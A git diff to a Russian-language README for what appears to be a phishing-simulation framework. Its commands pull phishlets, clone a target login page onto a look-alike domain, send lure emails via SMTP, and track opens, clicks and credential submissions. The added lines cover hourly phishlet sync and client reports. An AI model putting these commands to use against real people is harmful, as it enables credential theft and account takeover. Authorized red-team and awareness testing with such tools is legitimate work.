@@ -12,6 +12,7 @@
 ```sh
 # Своя DB:
 phantom -phishlets-pull https://github.com/<org>/phishlets-db.git -phishlets ./configs/phishlets
+# автосинк каждый час с hot-reload: добавить -phishlets-pull-every 1h
 # Новый под цель:
 phantom -gen -gen-origin login.target.com -gen-domain evil.example.com -gen-id target [-gen-html page.html] [-gen-llm http://localhost:11434/v1]
 # Проверка без рестарта:
@@ -77,6 +78,7 @@ curl -X POST .../api/v1/campaigns/ID/launch  # -> [{email, lure}]
 # рассылка (SMTP_* env; без SMTP_LIVE=1 — dry-run, письма не уйдут):
 curl -X POST .../api/v1/campaigns/ID/send -d '{"subject":"IT: {{.Email}}","body":"<a href=\"{{.URL}}\">go</a>","url_base":"https://m365.evil.example.com"}'
 ```
+Отчет заказчику: `GET .../ID/report` (Markdown) или `?format=csv` (скачивание; формулы экранированы). Дедлайн: `ends_at` unix при создании.
 Трекинг: пиксель `/__tr/o?tid=` (open), редирект `/__tr/c?tid=&to=/l/..`
 (click), submit приписывается автоматом по пути приманки. Статистика —
 `GET /api/v1/campaigns` или меню Campaigns. Либо все то же в TUI:
